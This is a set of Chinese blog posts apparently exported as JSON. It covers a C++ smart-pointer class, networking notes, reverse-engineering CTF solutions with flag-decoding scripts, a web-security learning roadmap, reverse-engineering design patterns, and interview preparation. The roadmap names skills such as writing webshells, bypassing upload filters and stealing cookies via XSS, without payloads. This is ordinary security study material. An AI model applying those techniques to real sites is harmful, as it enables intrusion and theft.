=重载 MySharedPtr&lt;T&gt;&amp; operator=(T* ptr);// MySharedPtr = T =重载 int getRef();//获得引用次数};template &lt;class T&gt; // 成员函数类外实现，需要template &lt;class T&gt;标识MySharedPtr&lt;T&gt;::MySharedPtr(T* p){ cout &lt;&lt; &quot;constructor&quot; &lt;&lt; endl; this-&gt;count = new int(1);//默认构造*count = 1 创建一个 int 型数，并且用()括号中的数据进行初始化 this-&gt;ptr = p;}template &lt;class T&gt; // 成员函数类外实现，需要template &lt;class T&gt;标识MySharedPtr&lt;T&gt;::MySharedPtr(const MySharedPtr&lt;T&gt;&amp; ohter){ cout &lt;&lt; &quot;copy func&quot; &lt;&lt; endl; this-&gt;count = &amp;(++ * ohter.count);//other的count先加1 ，再令this = other this-&gt;ptr = ohter.ptr;}template &lt;class T&gt;MySharedPtr&lt;T&gt;::~MySharedPtr(){ cout &lt;&lt; &quot;des&quot; &lt;&lt; endl; if (-- * count == 0)//先减 { delete count; count = nullptr; delete ptr; ptr = nullptr; }}// 类成员访问运算符-&gt;重载 语句 p-&gt;m 被解释为 (p.operator-&gt;())-&gt;mtemplate &lt;class T&gt;T* MySharedPtr&lt;T&gt;::operator-&gt;(){ cout &lt;&lt; &quot;operator-&gt;&quot; &lt;&lt; endl; return ptr;}template &lt;class T&gt;T&amp; MySharedPtr&lt;T&gt;::operator*(){ cout &lt;&lt; &quot;operator*&quot; &lt;&lt; endl; return *ptr;}template &lt;class T&gt;MySharedPtr&lt;T&gt;&amp; MySharedPtr&lt;T&gt;::operator=(MySharedPtr&lt;T&gt;&amp; other){ cout &lt;&lt; &quot;operator=1&quot; &lt;&lt; endl; if (this == &amp;other) { return *this; } --* this-&gt;count;//如果this 不等于 other 要先伪删除this if (*this-&gt;count == 0) { delete this-&gt;count; delete this-&gt;ptr; } ++* other.count; this-&gt;ptr = other.ptr; this-&gt;count = other.count; return *this;}template &lt;class T&gt;MySharedPtr&lt;T&gt;&amp; MySharedPtr&lt;T&gt;::operator=(T* ptr){ cout &lt;&lt; &quot;operator=2&quot; &lt;&lt; endl; if (this-&gt;ptr == ptr) { return *this; } --* this-&gt;count;//如果this 不等于 ptr 要先伪删除this if (*this-&gt;count == 0) { delete this-&gt;count; delete this-&gt;ptr; } this-&gt;count = new int(1);// ptr 没有conut ,要分配一个给它 this-&gt;ptr = ptr; return *this;}template &lt;class T&gt;int MySharedPtr&lt;T&gt;::getRef(){ return *count;}class Test{private: /* data */public: Test(/* args */); ~Test(); void test();};Test::Test(/* args */){ cout &lt;&lt; &quot;Test construcotr&quot; &lt;&lt; endl;}Test::~Test(){ cout &lt;&lt; &quot;Test des&quot; &lt;&lt; endl;}void Test::test(){ cout &lt;&lt; &quot;it's a test&quot; &lt;&lt; endl;}int main(){ MySharedPtr&lt;Test&gt; sPtr(new Test()); // 默认构造函数 sPtr-&gt;test(); cout&lt;&lt;sPtr.getRef()&lt;&lt;endl;//1,如果结束可以删除指针 --count MySharedPtr&lt;Test&gt; sPtr2 = sPtr; // 拷贝构造函数,count++ ,防止sPtr删除时sPtr2被使用到 sPtr2-&gt;test(); MySharedPtr&lt;Test&gt; sPtr3(sPtr); // 拷贝构造函数 sPtr3 = new Test(); // 赋值运算符2 sPtr3 = sPtr2; // 赋值运算符1，先删后等 MySharedPtr&lt;Test&gt; sPtr4; // 默认构造函数，ptr = nullptr sPtr4 = new Test(); // 赋值运算符2 // MySharedPtr&lt;Test&gt; sPtr4 = MySharedPtr&lt;Test&gt;(new Test()); Test* p = new Test(); MySharedPtr&lt;Test&gt; sPtr5(p); MySharedPtr&lt;Test&gt; sPtr6; sPtr6 = new Test(); Test* p7 = new Test(); MySharedPtr&lt;Test&gt; sPtr7 = p7; // MySharedPtr&lt;Test&gt; sPtr8 = new Test(); // 看运行结果只用到了默认构造函数，但是实际上编译器进行了优化，但是按照正常流程应该需要调用拷贝构造函数，将临时对象拷贝给sPtr8 // 但是拷贝构造函数不接收非const类型的临时变量，因此如何想以上面这两种形式初始化对象，必须将拷贝构造函数的参数设置为const类型，解释如下： // 当一个函数的形参为非const类型，而一个参数以非const传入， // 编译器一般会认为程序员会在该函数里修改该参数，而且该参数返回后还会发挥作用。 // 此时如果你把一个临时变量当成非const引用传进来，由于临时变量的特殊性， // 程序员无法对改临时变量进行操作，同时临时变量可能随时会消失， // 修改临时变量也毫无意义，因此，临时变量不能作为非const引用。 return 0;}","link":"/2022/04/10/%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88%E7%B1%BB/"},{"title":"计算机网络学习笔记","text":"摘要：计算机网络学习笔记 一.绪论 1.3种交换 计算机数据是突发式地出现在传输线路上的，试想：用户正在输入和编辑一份待传输的文件时，用户占用的通信资源暂时未被利用，但也不能被其他用户利用 2.分类计算机网络的基本组成：通信子网和资源子网定义：一些互相连接的、自治的计算机的集合 3.带宽、吞吐量、时延 接口速率如主机b的网卡速率 4.时延带宽积、往返时间(Round Trip Time)、利用率、丢包率 5.计算机网络体系架构 TCP/IP协议族(协议栈) 网络接口层并没有什么具体内容 分层的必要性 以太网交换机 路由器 12345类似的比如操作系统：有驱动程序，负责控制、监视硬件，并隐藏硬件细节，提供一个或多个接口。有内核，负责提供基础，结构内容。有接口库，负责把系统提供的服务包装成应用程序能使用的编程接口。有外围，提供特定高级服务部分。 6.专用术语实体、协议、服务 难点：模型和时延计算端到端：进程之间的通信点到点：主机之间TCP：传输控制协议 可靠UDP：用户数据报协议 不可靠无连接：通信双方不需要事先建立一条连接通路(电路交换)，直接发报文ICMP:网际层，但还需要使用IP协议封装成IP数据报后才能发送PPP协议：网络接口层 路由器只有将整个报文接收完后才能对其转发，而将报文划分成若干个更小的分组进行分组交换，路由器可以一边接收新到达的分组，一边转发先前已经接收到的分组 二、 总结 参考资料","link":"/2022/04/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"逆向CTF记录","text":"摘要：本文记录刷过的逆向题 一、逆向工具 提前要记住IDA的基操~~ 1234567891.shift+F12 查看string信息 (通常可以看到重要的信息 )2.Alt + T 查找带有目标字符串的函数3. F5 查看 C代码 把鼠标放在某句汇编上F5会到这句汇编的代码4. Ctrl + F 在函数框中 搜索函数5. 空格键 流程图与代码 来回切换6.x 交叉引用 7.h 转换10进制和16进制 r转换ASCII8.n 重命名9 g 跳转到地址 IDA的动态调试(linux) IDA的动态调试(gdb) IDA local windows debugger:直接运行即可，但注意目录不可有中文 对gdb进行强化的两个工具:peda和pwndbg，这两个工具可以强化视觉效果，可以更加清楚的显示堆栈，内存，寄存机的情况。但不兼容，使用时需切换 二、怎么看汇编IDA的start函数是编译器自动生成的，即在main()前要执行一些函数。可通过它找main()函数入口。main有三个参数，argc,argv,envp(环境参数)。如果实在找不到，看汇编，在IDA提供的入口往下翻，一般main函数call之前会push三个参数 函数、全局变量都是深颜色的，局部变量是浅颜色的 aMwwCTw和input都是字符串，字符串相减，减出来一定是数字才能作为input数组的索引(实在不知道也可以动态调试看地址)异或肯定是ASCII码或者数字异或，不可能是字符串。取地址*就是取了某一位 LL:long long 看前面的数字即可 三、实战题目XCTF1.ignite me拿到exe文件，放到die中脱壳，发现是exe32为程序，所以放到32位的IDA中， 2.入门逆向这里看到v2和v59这就证明了这是两个数组的运算，所以我们应该将上面的字符串分成两个数组，分别从v2和v59开始 0x13u的u表示无符号数 3.logmein从伪代码我们可以看到，解密所需要的密钥（v7）应该是字符串，但这里v7是LL型的（长长整形），所以在解密之前需要先将v7还原为字符。 这里转换并不复杂，只需将v7的值转换为hex（16进制）然后再转换为字符串，但由于字符是小端存储，所以转换成字符串后还需对字符串做倒置处理。 4.insanity注意字符串地址(cout有自动识别和转换机制)(&amp;str会编译成&amp;str[0]) 发现一个关键的字符串，&amp;strs,发现是取这个字符串输出，然后，跟进strs 5.python-trade步骤：EXE文件转pyc(py2exe:unpy2exe,pyinstall:pyinstxtractor)-&gt;检查前8字节是否是03 f3 0d 0a 76 ed db 57若不是要补上-&gt;pyc转py(uncompyle2) 1python C:\\anaconda3\\envs\\p2\\Scripts\\uncompyle2 aaa.pyc&gt;aaa.py ord() expected string of length 1, but int found 在python3下运行会出错而python2不会，原因是因为ord()这个函数接受的类型是一个长度为1的字符串，而在python3当中传入的i已经是一个整型数了，直接用i-16就可以完成操作 6.re1123memset()//作用是将某一块内存中的内容全部设置为指定的值memset(首地址,值,sizeof(地址总大小));memset(a,0,sizeof(a)) //初始化数组a为0 看看哪里涉及v5，可以看到开头的_mm_storeu_si128(），对其进行分析发现它类似于memset(),将xmmword_413E34的值赋值给v5，所以，我们可以得到正确的flag应该在xmmword_413E34中，然后，我们双击413E34进行跟进 这时，我们使用IDA的另一个功能 R ，能够将十六进制的数转换为字符串。(注意小端读取) 解法二：ODB中文搜索ASCII 解法三：ODB调试，发现判断时有个寄存器写入了flag,复制所有寄存器到剪贴板即可 7.Hello, CTF 8.no-strings-attached有两种方法可以获得flag，一种是分析decrypt()函数计算flag，另一种是动态调试。 banner就是输出两个字符串，prompt_authentication也是输出个字符串，最后剩下authenticate。 静态分析：显然s和dword都是数组， 每个元素占4字节(地址加4),字符串数组末尾的0要舍去。malloc也把v2的值赋给了dest 提取&amp;s(提取&amp;dword同理)可参考IDA Python提取数据 12345addr=0x08048AA8 #数组的地址arr = []for i in range(39): #数组的个数 arr.append(Dword(addr+4* i))print(arr) 解密脚本： 123456789101112131415161718s = [5178, 5174, 5175, 5179, 5248, 5242, 5233, 5240, 5219, 5222, 5235, 5223, 5218, 5221, 5235, 5216, 5227, 5233, 5240, 5226, 5235, 5232, 5220, 5240, 5230, 5232, 5232, 5220, 5232, 5220, 5230, 5243, 5238, 5240, 5226, 5235, 5243, 5248]a2 = [5121, 5122, 5123, 5124, 5125]v6 = len(s)v2 = v6v7 = len(a2)dest = sv4 = 0while(v4&lt;v6): for i in range(v7): if v4&lt;v6: dest[v4] -= a2[i] v4 += 1 else: breakfor i in range(len(dest)): print(chr(dest[i]),end=&quot;&quot;)#取消自动换行 动态调试： 123456789101112131415161718192021gdb no-string-attachedb *0x08048725 #下断点r #运行x/6sw $eax #查看eax的值n #单步运行一行高级语言命令ni #单步执行一条汇编指令disass 某个函数 #查看某个函数的汇编代码x/6sw $eax （使用examine命令（简写是x）来查看内存地址中的值）x /nfu 地址n：输出单元的个数f：显示格式，可以是下面的值(x:16进制t:二进制o:八进制d:10进制s:字符串)u：单元长度，可以是下面的值(b:代表字节h:代表双字节w:代表word，通常是4字节g:代表八字节) 9.csaw2013reversing2在菜单上的“Edit”、“Segments”、“Rebase program…”里将“Value”的值加上TargetApp的ASLR偏移。即Value = 0x400000+偏移量 注意_debugbreak()会设置断点并进入调试状态，此时若是动态调试的话会因为双重调试器使得程序退出，直接改成nop指令即可(汇编层面是Trap to Debugger) 第二个坑：if里面是没有弹框的，执行完解密就直接退出了！可以修改汇编的jmp到弹框地址 要先看C或C++伪代码再分析反汇编结构图最后才看反汇编文本！！！！我吃了很多亏在这里，总是以为能直接看懂汇编，但是无法掌握汇编的结构！ 静态调试：根据sub_401000的解密算法自己仿照C语言或python脚本解密，因为参数都可以跟踪到 这里是四个字节显示的，又由于小端存储，所以顺序是颠倒的，我们可以将其转换成一个字节(Byte,Word(2 Byte),Dword(4 Byte))查看,地址+1是1个Byte 12345678910x=[0xbb,0xaa,0xcc,0xdd]y=[0xBB,0xCC,0xA0,0xBC,0xDC,0xD1,0xBE,0xB8,0xCD,0xCF,0xBE,0xAE,0xD2,0xC4,0xAB,0x82,0xD2,0xD9,0x93,0xB3,0xD4,0xDE,0x93,0xA9,0xD3,0xCB,0xB8,0x82,0xD3,0xCB,0xBE,0xB9,0x9A,0xD7,0xCC,0xDD]i=0z=[]while i&lt;len(y): t=chr(y[i]^x[i%4]) z.append(t) i+=1print(z)print(''.join(z)) 10.getit 可以看到先判断v5是否大于s存储字符串的长度，然后通过运算，最后将得到的flag写入文件。但是有意思的地方在flag.txt文件所在的位置是/tmp目录，这个目录是Linux下的临时文件夹，程序运行完，生成flag的txt文件被清理了，所以我们找不到文件。所以自然地想到动态调试 11.迷宫参考解答 12.calcKey.elf先file查看一下 1234Stripped和not stripped的最大区别：stripped：将程序中的符号表的信息剔除掉了，这样子编译出来的可执行文件体积比较小；not stripped：则反之，但是就是因为其保留了这些信息，所以便于调试。一般最终的程序都会使用strip来减小可执行文件的体积。而调试中的程序则不使用strip。 四、遇到的问题1.反编译时positive sp value has been found栈sp不平衡，在options-&gt;General-&gt;Disassembly显示栈指针，然后发现提示的语句有负值(显示为负，实际为正，即实际中栈指针ESP不能为正值)，修改上一条语句直至提示的语句的栈指针显示为正值","link":"/2022/05/02/%E9%80%86%E5%90%91CTF%E8%AE%B0%E5%BD%95/"},{"title":"web ctf路线","text":"摘要：本文介绍了我学习web的路线 一.初期刚入了web安全的坑，面对诸多漏洞必然是迷茫的，首要任务就是打好网站开发的基础，曾有伟人说过-“自己不会做网站，何谈去找网站的漏洞”，在学习漏洞前，要了解基本网站架构、基础网站开发原理，基础的前后端知识，能够让你之后的漏洞学习畅通无阻。 html+css+js（2-3天）前端三要素 html、css、js是被浏览器解析的代码，是构成静态页面的基础。 重点了解html和js 能力要求：能够写出简单表单，能够通过js获取DOM元素，控制DOM树即可。 资料：acwing web课 解题：js审计、xss、csrf apache+php （4-5天）ctf里大部分代码审计都是php,php黑魔法也是常考的通过apache+phpstudy体会一下网站后端的工作，客户端浏览器通过请求apache服务器上的php脚本，php执行后生成的html页面返回给浏览器进行解析。 能力要求：了解基本网站原理，了解php基本语法，开发简单动态页面 资料：菜鸟教程;w3school;CTFHub 解题：php审计 文件上传 mysql（2-3天）之前已经安装的phpstudy可以轻易的安装mysql。大部分网站都会带有数据库进行数据存储 能力要求： 能够用sql语句实现增删改查，并且能用php+mysql开发一个增删改查的管理系统（如学生管理系统） 资料：菜鸟教程;w3school 解题：SQL注入python (2-3天) 学习语法、正则、文件、网络、多线程等常用库。重点学习requests、BeautifulSoup、re这三个库 能力要求： 了解python基础语法，能够用python爬取网站上的信息（requests+BeautifulSoup+re） 资料:菜鸟教程;w3school acwing django课 工具burp(1-2天) 重点学习Proxy、Repeater、Intruder三个模块，分别用于抓包放包、重放包、爆破 能力要求： 能够用burpsuite抓包改包、爆破用户名密码。只需初步使用即可，在中期的漏洞学习中去逐渐熟练它 资料：https://www.bilibili.com/video/BV1aq4y1X7oE30天 中期此时我们应该对网站已经不再陌生，能够自己动手完成一个简单站点。但我们写出来的代码真的安全吗？进入中期，我们便要开始着眼经典漏洞的学习。 一个漏洞的学习，要搞明白三点（每学完一个漏洞就问三个问题） 123如何利用这个漏洞？为什么会产生这个漏洞？如何修复这个漏洞？ SQL注入（7-8天）从这里开始被灌输 “永远不信任用户的输入” 的口号。现在sql注入也依旧存在，并且它还在不断衍生出如nosql注入、ORM注入等。 能力要求： 能够手工注入出任意表的数据，熟悉三种盲注的手法，能够通过sql注入实现任意文件读取和任意文件写入，能够自己编写一个不含sql注入的查询功能 资料：sqli-labs 如何使用它网上有很多教学，wp也有很多大佬写了 这里贴一个wiki刷题,看总结[极客大挑战 2019]EasySQL[极客大挑战 2019]LoveSQL[SUCTF 2019]EasySQL 文件上传（7-8天）webshell是可以进行代码执行的木马文件上传其实就是想办法把webshell上传到目标的服务器上去并成功解析，达到控制目标服务器的目的 能力要求： 会写php的webshell，明白webshell的原理，熟悉常见的文件上传绕过方法（如过后缀检测、过文件头检测、过MIME类型检测），能够自己编写一个不含漏洞的上传功能(自己测试) 推荐学习资料upload-labs 几乎涵盖所有上传漏洞类型wiki刷题,看总结 趁手的webshell管理工具： 蚁剑 其他漏洞（14-15天）以上两个漏洞是初学者最应该掌握也是最典型的漏洞，涵盖了代码执行、文件操作、数据库操作等web应用的主体内容。然而web安全的世界还有很多的漏洞需要你去探索，不过学会了这两种漏洞的你去学其他漏洞定然是游刃有余 123456781.命令执行（RCE）php常见的代码执行（eval）、命令执行（system）函数2.文件包含file协议、php伪协议的利用3.XSS通过XSS获取用户cookie4.CSRF通过csrf让用户点击恶意链接就触发敏感操作 资料：wiki刷题,看总结 后期多多参与CTF赛事即使是初学者也能够找到一些适合自己能力的赛事，比如极客大挑战、UNCTF、各个大学的新生赛等等都是不错的选择，在比赛中去发现自己知识的不足，然后去针对的补充这部分知识，是很好的学习循环，无需迷茫的去到处获取知识，而是在需要时去学习。Tips: 或许有人觉得直接刷题是一样的，但完全不是，当下比赛中的题往往更加前沿和流行，你可以找到当下的ctf题目趋势，紧跟技术热点，而且可以多多融入ctf竞技的氛围中，成长的更快。 ctfhub 可以很方便的查看最近举行的ctf赛事 ctftime 多多看其他师傅的博客打完ctf比赛的你肯定是想看writeup（答案）的，一般来说赛后过几天就会有很多师傅发出他的writeup，从比赛群、百度等途径都可以找到。多多看看其他师傅的解题思路，关注几个大牛，看看他们发的技术文章，都是很好的学习方法。 总结 参考资料1.","link":"/2022/04/18/private/web%20ctf%E8%B7%AF%E7%BA%BF/"},{"title":"设计模式逆向","text":"设计模式的逆向特征 一、创建型1.工厂模式 单继承实际上单继承就是把 baseClass 的成员变量完全copy了一份放在了childClass的前面。 多继承其实也都是成员变量按顺序往后排 虚函数与虚表C++实现虚函数的方法是：为每个类对象添加一个隐藏成员，隐藏成员保存了一个指针，这个指针叫虚表指针（vptr），它指向一个虚函数表（virtual function table, vtbl）。在运行时创建对象时，对象的虚表指针将设置为指向合适的虚表。如果该对象调用一个虚函数，则通过在该对象的虚表中进行查询来选择正确的函数。每个类使用一个虚函数表，每个类对象用一个虚表指针。 对于包含虚函数的类，必须将一个虚表指针作为类中的第一个字段。在计算对象的总大小时，也必须考虑到虚表指针。这种情况在使用new操作符动态分配对象时最为明显，这时，传递给new的大小值不仅包括类（以及任何超类）中的所有显式声明的字段占用的空间，而且包括虚表指针所需的任何空间 this指针this可以看成是传递到所有非静态成员函数的第一个隐藏参数,Microsoft Visual C++利用thiscall调用约定，并将this传递到ECX寄存器中。从逆向工程的角度看，在调用函数之前，将一个地址转移到ECX寄存器中可能意味着两件事情。首先，该文件使用Visual C++编译；其次，该函数是一个成员函数。如果同一个地址被传递给两个或更多函数，我们可以得到结论，这些函数全都属于同一个类层次结构。如果发现一个函数向其他函数传递this指针，则这些函数可能和传递this的函数属于同一个类。 纯虚函数的标志 main()用到AppleFactory 所以data段不会出现AppleFactory类 2.单例模式单例模式的构造函数是私有函数，但是在反汇编看不出私有属性。 类继承权限 类的继承权限并不会影响子类继承父类子类所拥有的父类的成员变量个数，换句话说，不管父类的成员变量是什么权限，子类都完全拥有一份父类的成员变量的拷贝 所以只能通过观察其属性成员是static定义的，大概率是单例模式 release模式(静态成员的动态封装类) 3.建造者模式指导者类里含有一个建造者对象，建造者类里含有一个建造物对象。可以通过看构造函数观察特征另一个特征是director类会按照逻辑顺序依次调用builder类里的函数，如图 4.原型模式 实质就是找拷贝构造 由此可见调用子类的拷贝构造函数会先调用父类的构造函数，然后在调用当前类的拷贝构造，这里的off_85600就是 vptr ，从虚函数表中也可以看见，子类覆盖了父类的虚函数就会指向子类的虚函数。 若没有覆盖，表项中依旧是指向父类的函数地址，而且顺序是按照父类的虚函数表顺序排列，子类中父类没有的虚函数会按顺序继续排在后面，不同类的虚函数表其实都是在编译期就已经确定了的，不同类的虚函数表处于临近的内存区域。 二、创建型1.代理模式 代理类a包含被代理类b的实例，a,b类实现协议类protocol 代理类a和被代理类b接口相同 代理类a包含被代理类b的实例 代理类接口的汇编，会发现call了被代理类的接口(实际情况应该会有相同的输入参数) 2.装饰模式 分为若干个具体类和若干个装饰类，都是继承自同一个抽象类。 每个装饰类都含有一个抽象类对象 每个装饰类都含有与抽象类有相同接口的虚函数，不同于具体类的虚函数是对抽象类的具体实现，装饰类的这个虚函数一定会调用抽象对象的虚函数，同时加上装饰类新增的自定义函数。 具体类对抽象类纯虚函数的实现 装饰类的相同接口，调用了抽象对象(可以是父类指针指向子对象)的虚函数 实现了自定义的装饰 3.适配器模式 将一个接口(已有接口类)转换成客户希望的另一个接口(用户接口类) 适配器类里会有一个已有接口类对象 适配器类的父类是用户接口类(抽象类) 适配器类虚函数是对用户接口类纯虚函数的具体实现，且里面一定会调用已有接口类的函数(且接口一般与该虚函数的接口不同) 4.桥接模式 将抽象部分与它的实现部分分离,分为桥接类(抽象部分，如car)和实现类(实现部分，如enginee),两个大类各自可有抽象类和具体类。如图，找到了两个抽象类，分别为car和enginee 桥接类的抽象类里含有实现类的抽象类对象通过子类的构造函数找到了抽象类car的构造函数，改名为car::car,注意a2是enginee类强转到int64 且两者纯虚函数接口相同，桥接类的虚函数具体实现一定会调用实现类对象的虚函数 5.组合模式 单个对象和组合对象继承自同个抽象类，接口一致，但实现可能不一致（如返回NULL） main函数定义的实例是树形对象，对象往往包含类似于装有抽象类对象的list容器 如图，v20是根节点root,v19是子节点Dir,v18是子节点File 6.外观模式 外观类中有多个同层次的子系统类 直接查看Facade的构造函数，如果是系统自动定义的会显示表示出创建的成员对象,但在这里我们是通过new的方式的默认构造函数，所以会出现三行分配空间的代码，比较难读懂 可以转变思路，直接看Facade的函数，发现dothing函数里调用了三个子系统的dothing函数，说明外观类中有三个子系统类的对象 7.享元模式 音乐服务根据收费划分出免费用户和会员用户，免费用户只能听部分免费音乐，会员用户可以听全部的音乐，并且可以下载。虽然权限上二者间有一些区别，但是他们所享受的音乐来是自于同一个音乐库，这样所有的音乐都只需要保存一份就可以了。另外如果出现音乐库里没有的音乐时，则需要新增该音乐，然后其他服务也可以享受新增的音乐，相当于享元池或缓存池的功能 可以动调，通过创建相同对象来看看享元池是否只保存了一次。或者输入条件相同时查询的是否是同一个对象。 可看出数据结构进而推断出享元池的保存形式 三、行为型1.模板方法模式 抽象类里有模板函数来决定其他函数的执行顺序和逻辑 2.命令模式 一个对象(Car)调用另一个对象(Engine)的过程是：创建目标对象实例；设置调用参数；调用目标对象的方法。如果调用过程较繁琐，或者有多处调用，有必要用一个专门的类对这种调用过程进行封装，即command类 虽然有命令排序、批量提交等复杂操作，但本质还是看command类的特征 command类(抽象类或具体类)一般包含一个要调用的目标对象 命令的执行函数一定会调用目标对象的方法，一般比较繁琐或调用得比较多 3.职责链模式 子类完全平等，即哪个都有可能是下一个事件，即所有类都会有一个设置下一个处理单元的函数，(可能在抽象类实现然后继承抽象类)且参数必须是抽象类 一般抽象类或子类会有一个抽象类对象，来作为下一个处理单元 子类的执行函数Handle()里会调用下一个处理单元的执行函数,即调用了相同的函数(除非恰好到了最后一个任务，下一个是结束任务NULL) 4.策略模式 定义一系列算法类，将每一个算法封装起来，并让它们可以相互替换，策略模式让算法独立于使用它的客户而变化 要做到可替换性，实现类含有的策略类对象或函数参数一定要是抽象类 5.中介者模式 中介者模式将一个网状的系统结构变成一个以中介者对象为中心的星形结构，在这个星型结构中，使用中介者对象与其他对象的一对多关系来取代原有对象之间的多对多关系。所有成员通过中介者交互 中介者类一般含有多个相同的抽象类或子类，或者是装着这些类的容器等，一般是一对一或一对多 中介者类的函数方法会用到这些其他类的对象以实现交互 其他的对象可能含有一个中介者类对象，且会用到中介者类的函数，并把自身的类作为参数传进去，以实现交互 6.观察者模式 定义对象之间的一种一对多依赖关系，使得每当一个对象状态发生改变时，其相关依赖对象皆得到通知并被自动更新。 一般通知者类里会有一个装有被通知者类对象的容器 通知者类的执行函数会遍历容器内的每一个被通知者类对象，并调用被通知者类对象函数(找循环) 7.备忘录模式 分为原发器类和存档类，两者的成员大体相同(看构造函数) 原发器类含有一个存档函数和读档函数，分别以存档类对象作为返回值和函数参数。且调用的都是原发器类中的函数方法，存档类对象一般只作为参数和返回值 main函数多次调用存档-读档函数，且用对象自身上一个状态来调用存档函数，保存到一个存档类对象中，然后修改属性变动到下一个状态。若要读档，则把该存档类对象作为读档函数的参数。 8.访问者模式 包含访问者和被访问元素两个主要组成部分，被访问的元素通常具有不同的类型(或不同的子类) 一般接收的函数参数是抽象类指针，然后根据不同的访问者可以对它们进行不同的访问操作。 被访问的元素通常是只读的，写操作如下(把某个值写进了某个地址)。或者可以动态调试下，看某个地址存储的内容在程序执行过程中有无改变 9.状态模式 分为对象类和状态类，对象类中含有一个状态类对象，表示对象当前状态，且有设置状态和得到状态等函数方法 在状态类里实现对象类具体要做的功能，功能函数以对象类对象作为函数参数。状态类的不同子类表示不同的状态 功能函数会判断对象类对象的当前状态是否应该是该子类状态，如果不是就设置对象类对象的状态为下一个状态，并再次调用下一个状态的功能函数来判断。子类的功能函数高度相似，只是状态之间是环形结构 10.解释器模式 分为语言类和解释器类，解释器类的子类表示不同的解释方法。 解释器类的解释函数以语言类对象作为函数参数 11.迭代器模式 迭代器可理解为指针，迭代器类里存有数组类的对象指针和一个游标表示迭代器当前所指向的位置 数组类类似数据库，函数方法只实现存储和返回数据等功能 迭代器类有Next函数表示游标的移动 创建迭代器的函数方法在数组类里","link":"/2022/04/10/private/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E9%80%86%E5%90%91/"},{"title":"面经","text":"摘要：面经 自我介绍您好，我叫张仕炫，今年21岁，来自清华大学电子信息科学与技术专业，然后现在是在念大三。然后是这学期开始对网络安全感兴趣，开始自学了一部分web安全知识和逆向工程的知识，然后也是对渗透测试和红蓝攻防这方面很感兴趣。为了提升自己在网络安全这方面的能力，我曾经在清华网络研究院和中科院信工所六室那边实习，学过一些工具的使用比如burp、sqlmap，也会用IDA、gdb这些调试工具对程序进行逆向分析。然后主要使用的编程语言是C++和C，也略微了解一点python,mysql和汇编语言。然后做过的项目有用verilog写过一个MIPS流水线处理器，然后是用C++写过一个比较简单的学生成绩后台管理系统，大一的时候还做过一个双轮自平衡循迹小车参加了校内的硬件设计大赛并且得到优秀作品。现在是在做一个对设计模式进行逆向分析的项目。然后非常希望暑期可以来绿盟这边实习接触一些实战，跟一些师傅和导师学习一下。 问题1.公司对实习生的培养模式是什么呢2.实习地点是在北京吗3.公司可以给开实习证明吗，因为学校这边实习是算学分的，需要实习证明4.您认为我的表现怎么样，接下来应该提高哪方面呢5.接下来的安排?还有面试吗 一.二进制1.如何快速判断一个文件是否为病毒？把程序copy到虚拟机里，用sandbox运行程序。查看是否有捆绑运行等行为，查看网络是否有可疑端口向外网IP连接。查看是否有对文件操作的可疑行为。结束sandbox里的程序，查看各个目录与临时目录下释放的文件。 2.病毒和木马有何区别？各类病毒的共同特征是自我复制、传播，破坏计算机系统。木马主要是黑客用来潜入宿主计算机，进行信息窃取的程序。 3.如何判断一个文件是可执行文件？ 可执行文件就是PE(Portable Executable)格式的文件，其拓展名可以是EXE、DLL、ELF、OCX、SYS、COM等 4、gdb常见调试命令（gdb）help：查看命令帮助，具体命令查询在gdb中输入help + 命令,简写h（gdb）run：重新开始运行文件（run-text：加载文本文件，run-bin：加载二进制文件）,简写r（gdb）start：单步执行，运行程序，停在第一执行语句（gdb）list：查看原代码（list-n,从第n行开始查看代码。list+ 函数名：查看具体函数）,简写lb:下断点r:运行程序（gdb）print：打印值及地址,简写p（gdb）set：设置变量的值（gdb）next：单步调试（逐过程，函数直接执行）,简写n（gdb）step：单步调试（逐语句：跳入自定义函数内部执行）,简写s（gdb）info：查看函数内部局部变量的数值,简写i（gdb）finish：结束当前函数，返回到函数调用点（gdb）continue：继续运行,简写c（gdb）quit：退出gdb,简写q（gdb）watch：被设置观察点的变量发生修改时，打印显示（gdb）x：查看内存x/20xw 显示20个单元，16进制，4字节每单元 5.简述一下C++ 从代码到可执行二进制文件的过程C++ 从代码到可执行二进制文件经过四个过程，分别是：预编译、编译、汇编、链接。 预编译，主要的处理操作：a.将所有的 #define 删除，并且展开所有的宏定义（宏替换）b.处理所有的条件预编译指令，如 #if、#ifdefc.处理 #include 预编译指令，将被包含的文件插入到该预编译指令的位置d.删除所有的注释e. 添加行号和文件名标识 编译：将预处理之后的代码转换成特定的汇编代码，主要包括词法分析、语法分析、语义分析、优化代码等操作 汇编：将汇编代码汇编成机器指令 链接：将不同源文件生成的目标代码以及其它目标代码、库文件组合起来，从而形成可执行程序加分回答链接分为静态链接和动态链接。 静态链接：静态链接是由链接器在链接时将库的内容加入到可执行程序中，将一个或多个库或目标文件（先前由编译器或汇编器生成）链接到一块生成可执行程序。 动态链接：动态链接在链接后动态库仍然与可执行文件分离，直到运行时才动态加载。 二、网络基础1.osi / tcp-ip / 原理体系架构 1234应用层 运输层网际层(IP:Internet Protocol（网际互连协议）)网络接口层 2.三次握手三次握手是指建立一个 TCP 连接时，需要客户端和服务器总共发送3个包第一次握手([SYN], Seq = x) 客户端发送一个SYN标记的包，Seq初始序列号x，发送完成后客户端进入SYN_SEND状态第二次握手([SYN,ACK], Seq = y, ACK = x + 1)服务器返回确认包(ACK)应答，同时还要发送一个SYN包回去。ACK = x + 1,表示确认收到(客户端发来的Seq值 + 1)，Seq= y, 表示让客户端确认是否能收到。发送完成后服务端进入SYN_RCVD状态第三次握手([ACK], ACK = y + 1) 客户端再次发送确认包(ACK),ACK = y + 1,表示确认收到服务器的包（服务端发来的Seq值 +1）。客户端发送完毕后，进入ESTABLISHED状态，服务端接收到这个包，也进入ESTABLISHED状态, TCP握手结束 为什么要建立TCP连接要三次握手呢？为了确认客户端和服务器的接收与发送能力是否正常第一次握手：客户端向服务器发送包，服务端收到了。这样服务端就能知道：客户端的发送能力、服务端的接收能力是正常的第二次握手：服务端向客户端发送确认包应答，客户端收到了。这样客户端就能知道：服务端的接收、发送能力，客户端的接收、发送能力是正常的。不过此时服务器并不能确认客户端的接收能力是否正常第三次握手：客户端再次发送确认包，服务端收到了。这样服务端就能得知道：客户端的接收、发送能力正常，服务器自己的发送、接收能力也正常 